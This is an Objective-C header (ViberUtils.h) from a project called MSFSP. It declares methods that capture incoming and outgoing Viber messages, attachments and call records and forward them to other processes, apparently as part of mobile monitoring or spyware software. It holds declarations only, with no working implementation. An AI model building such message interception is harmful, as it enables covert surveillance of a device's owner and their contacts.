//
//  ViberUtils.h
//  MSFSP
//
//  Created by Makara Khloth on 4/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "FxEventEnums.h"


@class FxIMEvent, FxVoIPEvent, Attachment;
@class DBManager, ViberMessage, PLTMessage;
@class SharedFile2IPCSender;

@interface ViberUtils : NSObject {
	NSOperationQueue	*mQueryQueue;
	
	SharedFile2IPCSender	*mIMSharedFileSender;
	SharedFile2IPCSender	*mVOIPSharedFileSender;
}

@property (readonly) NSOperationQueue *mQueryQueue;

@property (retain) SharedFile2IPCSender	*mIMSharedFileSender;
@property (retain) SharedFile2IPCSender *mVOIPSharedFileSender;

+ (id) sharedViberUtils;

+ (void) sendViberIMEvent: (FxIMEvent *) aIMEvent;

+ (void) sendViberEvent: (FxIMEvent *) aIMEvent
			 Attachment: (Attachment *) aAttachment
		   viberMessage: (ViberMessage *) aViberMessage
			 shouldWait: (BOOL)aShouldWait
		  downloadVideo: (BOOL)aDownloadVideo;

// Version 3.1, 4.0, 4.2 (this method can only be called within the thread of the caller)
+ (void) captureViberMessageWithInfo: (NSDictionary *) aViberMessageInfo
					   withDBManager: (DBManager *) aDBManager
						  isOutgoing: (BOOL) aOutgoing;

+ (void) captureIncomingViberEvent: (ViberMessage *) aViberMessage
					withPLTMessage: (PLTMessage *) aPLTMessage;

+ (FxVoIPEvent *) createViberVoIPEventForContactID: (NSString *) aContactID
									   contactName: (NSString *) aContactName
										  duration: (NSInteger) aDuration
										 direction: (FxEventDirection) aDirection;
+ (void) sendViberVoIPEvent: (FxVoIPEvent *) aVoIPEvent;

@end
